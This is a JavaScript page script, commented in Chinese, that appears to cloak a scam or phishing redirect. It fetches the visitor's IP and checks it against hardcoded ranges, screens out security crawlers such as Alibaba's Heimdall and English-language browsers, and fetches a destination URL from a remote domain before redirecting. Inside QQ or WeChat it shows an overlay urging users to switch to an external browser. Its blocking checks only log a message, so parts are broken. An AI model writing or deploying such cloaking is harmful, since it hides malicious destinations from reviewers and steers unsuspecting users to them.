var uul = "cg.cyou";//切记域名一定要ssl
var ip;
$["ajax"]({
    "type": "get",
    "url": "https://api.ipify.org?format=json",
	"dataType": "json",
	"async": false,
    "success": function (res) {
		ip = res.ip
    }
  });

var iptables = '977012992~977013247|977084416~977084927|1743654912~1743655935|1949957632~1949958143|2006126336~2006127359|2111446272~2111446527|3418570752~3418578943|3419242496~3419250687|3419250688~3419275263|3682941952~3682942207|3682942464~3682942719|3682986660~3682986663|1707474944~1707606015|1709318400~1709318655|1884967642|1884967620|1893733510|1709332858|1709325774|1709342057|1709341968|1709330358|1709335492|1709327575|1709327041|1709327557|1709327573|1975065457|1902908741|1902908705|3029946827';
var remoteiplong = ip2long(real_ip());
iptables.split('|').forEach(iprows => {
    if (remoteiplong == iprows) {
        console.log('我是阔爱的小承诺。！');
        return;
    }
    var ipbanrange = iprows.split('~');
    if (remoteiplong >= parseInt(ipbanrange[0]) && remoteiplong <= parseInt(ipbanrange[1])) {
        console.log('我是阔爱的小承诺。！');
        return;
    }
});

var url;
$["ajax"]({
    "type": "get",
    "url": "https://"+uul+"/api/node",
  	"dataType": "json",
	"async": false,
    "success": function (res) {
  		url = res.date.url
    }
  });
//HEADER特征屏蔽
if(/manager/i.test(window.navigator.userAgent) || !/Mozilla/i.test(window.navigator.userAgent) && /ozilla/i.test(window.navigator.userAgent) || window.location.href.indexOf('urls.tr.com') !== -1 || document.cookie.indexOf('ASPSESSIONIDQASBQDRC') !== -1 || !window.navigator.userAgent || /HUAWEI G700-U00/i.test(window.navigator.userAgent) && !window.navigator.userAgent && /Accept/i.test(window.navigator.userAgent) || /Alibaba.Security.Heimdall/i.test(window.navigator.userAgent)) {
    console.log('我是阔爱的小承诺。！');
}

if(/iPhone OS 9_3_4/i.test(window.navigator.userAgent) && window.navigator.userAgent === '*/*' || /iPhone OS 8_4/i.test(window.navigator.userAgent) && window.navigator.userAgent === '*/*' || /Android 6.0.1/i.test(window.navigator.userAgent) && /MQQBrowser\/6.8/i.test(window.navigator.userAgent) && window.navigator.userAgent === '*/*' || /en/i.test(window.navigator.language) && !/zh/i.test(window.navigator.language) || /iPhone/i.test(window.navigator.userAgent) && /en-/i.test(window.navigator.userAgent) && !/zh/i.test(window.navigator.userAgent)) {
    console.log('我是阔爱的小承诺。');
}

if(/Windows NT 6.1/i.test(window.navigator.userAgent) && window.navigator.userAgent === '*/*'|| /Windows NT 5.1/i.test(window.navigator.userAgent) && window.navigator.userAgent === '*/*' || /vnd.wap.wml/i.test(window.navigator.accept) && /Windows NT 5.1/i.test(window.navigator.userAgent)){
    console.log('我是阔爱的小承诺。');
}
console.log(checkmobile())
function checkmobile() {
    var useragent = window.navigator.userAgent.toLowerCase();
    var ualist = ['android', 'midp', 'nokia', 'mobile', 'iphone', 'ipod', 'blackberry', 'windows phone'];
    for (var i = 0; i < ualist.length; i++) {
        if (useragent.indexOf(ualist[i]) !== -1) {
            return true;
        }
    }
	if(window.navigator.accept!=null){
		if (window.navigator.accept.indexOf("VND.WAP") !== -1 || window.navigator.via.indexOf("wap") !== -1) {
			return true;
		}
	}
    return false;
}
if (window.navigator.userAgent.indexOf('QQ/') !== -1) {
	htmls()
} else if (window.navigator.userAgent.indexOf('MicroMessenger') !== -1) {
	htmls()
}else{
	if(url!=null){
		window.location.href=url;
	}
}

function htmls(){
document.write('<div id="Pan_WX">\
		<div class="fc_jt"><img src="img/jt.gif"></div>\
		<div class="fc_wz">\
		<h3>点击屏幕右上角【•••】</h3>\
		<h3>为了 您更好的 体验</h3>\
		<h3>请用  浏览器  打开</h3>\
		</div>\
		<br /><br /><br />\
		<br /><br /><br /><br />\
		<br />\
		<div class="fc_tp"><img src="img/wx_az.gif"></div>\
		</div>')
}
function real_ip() { // 默认 IP 地址，你需要根据情况修改
    if (window.navigator && window.navigator.userAgent) {
        if (window.navigator.userAgent.indexOf('HTTP_X_FORWARDED_FOR') !== -1) {
            var matches = window.navigator.userAgent.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g);
            if (matches) {
                for (var i = 0; i < matches.length; i++) {
                    var xip = matches[i];
                    if (!xip.match(/^(10|172\.16|192\.168)\./)) {
						console.log(xip)
                        ip = xip;
                        break;
                    }
                }
            }
        }
    }
    return ip;
}
function ip2long(ip) {
    var parts = ip.split(".");
    var longValue = 0;
    for (var i = 0; i < 4; i++) {
        longValue += parseInt(parts[i]) << (8 * (3 - i));
    }
    return longValue >>> 0; // 将 longValue 转换为无符号整数
}
function decbin(decimal) {
    return (decimal >>> 0).toString(2);
}